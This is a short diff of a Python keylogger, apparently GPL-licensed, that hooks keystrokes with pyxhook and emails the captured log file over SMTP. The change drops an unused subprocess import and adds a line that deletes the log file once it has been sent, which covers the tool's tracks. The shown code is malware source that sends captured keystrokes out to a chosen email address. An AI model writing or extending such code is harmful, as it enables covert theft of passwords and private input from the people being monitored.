@@ -16,7 +16,7 @@
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>
 
 import pyxhook
-import datetime,os,sys,subprocess
+import datetime,os,sys
 import argparse as args
 import smtplib
 from time import *
@@ -140,6 +140,7 @@ try:
       fob.close()
       new_hook.cancel()
       send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+      os.remove(log_file)
 
   new_hook = pyxhook.HookManager()
   new_hook.KeyDown= OnKeyPress
